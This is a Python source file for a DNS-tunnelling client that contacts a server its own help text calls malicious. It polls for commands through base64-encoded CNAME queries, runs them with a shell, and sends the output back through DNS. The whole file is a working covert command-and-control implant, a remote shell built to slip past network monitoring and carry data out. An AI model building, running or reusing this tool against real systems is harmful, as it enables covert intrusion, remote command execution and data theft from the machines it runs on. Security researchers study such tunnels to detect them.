
from argparse import ArgumentParser
import base64
import dnslib
import socket
import time
from enum import Enum
import subprocess
from collections import deque
import string
import random

def chunk_string(s: str, chunk_size: int) -> deque[str]: 
    d = deque()
    for i in range(0, len(s), chunk_size): 
        d.append(s[i:i+chunk_size])
    return d

class TunnelMessageType(Enum): 
    PROBE = "P"
    ACK = "A"
    FILE_START = "FS"
    FILE_END = "FE"
    CONN = "C"

def print_status(s: str, icon="*"): 
    print(f"[{icon}] {s}")

def random_characters(num_chars: int) -> str: 
    chars = ""
    for _ in range(num_chars): 
        chars += random.choice(string.ascii_letters)
    return chars

class Tunneler: 
    def __init__(self, attacker_domain: str, resolver_ip_addr: str): 
        self.attacker_domain = attacker_domain
        self.resolver_ip_addr = resolver_ip_addr
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def tunnel_text(self, text: str, sleep_time: float, chunk_size: int): 
        self.tunnel(TunnelMessageType.FILE_START.value)
        chunked = chunk_string(text, chunk_size) 
        while chunked: 
            self.tunnel(chunked.popleft())
            time.sleep(sleep_time)
        self.tunnel(TunnelMessageType.FILE_END.value)

    def tunnel(self, text: str) -> str: 

        output = ""

        encoded = base64.urlsafe_b64encode(text.encode()).decode().strip("=")

        # generate a randomized middle domain to avoid cacheing 

        domain = f"{encoded}.{random_characters(3)}.{self.attacker_domain}"

        q = dnslib.DNSRecord.question(domain, qtype="CNAME")

        self.socket.sendto(q.pack(), (self.resolver_ip_addr, 53))

        response, _ = self.socket.recvfrom(4096)

        reply = dnslib.DNSRecord.parse(response)

        for rr in reply.rr: 
            if rr.rtype == dnslib.QTYPE.CNAME: 
                data = str(rr.rdata).split('.')[0]
                output += base64.urlsafe_b64decode(data + "==").decode()
        return output
        

    def _chunk_string(self, s: str, chunk_size: int): 
        return [s[i:i+chunk_size] for i in range(0, len(s), chunk_size)]

def main(): 

    parser = ArgumentParser(description="DNS Tunneler Options")

    parser.add_argument("--interval_seconds", required=False, help="Seconds between each query sent to the server")

    parser.add_argument(
        "--domain",
        required=True,
        help="Domain of the malicious authoritative server",
    )

    parser.add_argument(
        "--chunk_size", 
        required=False, 
        help="Chunk size of data sent over each query. Must be greater than or equal to 2",
        default=30
    )

    args = parser.parse_args()

    chunk_size = int(args.chunk_size)
    assert chunk_size >= 2

    resolver_ip = ""
    with open("/etc/resolv.conf") as f: 
        for line in f: 
            if line.strip().startswith("nameserver"): 
                resolver_ip = line.split()[1]

    tunneler = Tunneler(attacker_domain=args.domain, resolver_ip_addr=resolver_ip)

    print_status("Connecting...")
    response = tunneler.tunnel(TunnelMessageType.CONN.value)

    if (response != TunnelMessageType.ACK.value): 
        print_status("Failed to connect to DNS tunneling server", "!")
        return 

    print_status(f"Connected to DNS tunneling server for domain: {args.domain}")

    command_buffer = ""

    sleep_time = 0.1 if args.interval_seconds is None else float(args.interval_seconds)

    while True: 

        time.sleep(sleep_time)

        response = tunneler.tunnel(TunnelMessageType.PROBE.value)

        if response == TunnelMessageType.ACK.value or response == TunnelMessageType.FILE_START.value: 
            continue

        if response == TunnelMessageType.FILE_END.value:
            print_status(f"Executing command {command_buffer}")
            try: 
                result = subprocess.run(
                    command_buffer,
                    capture_output=True,
                    text=True,
                    shell=True
                )
                if result.stdout: 
                    tunneler.tunnel_text(result.stdout, sleep_time, chunk_size)
                if result.stderr: 
                    tunneler.tunnel_text(result.stderr, sleep_time, chunk_size)

            except Exception: 
                tunneler.tunnel_text(f"Could not run command: {response}", sleep_time, chunk_size)

            print_status("Execution result sent")
            command_buffer = ""

        elif not response: 
            print_status("Disconnected", "!")
            break 

        else: 
            command_buffer += response


if __name__ == "__main__": 
    try: 
        main()
    except KeyboardInterrupt: 
        pass




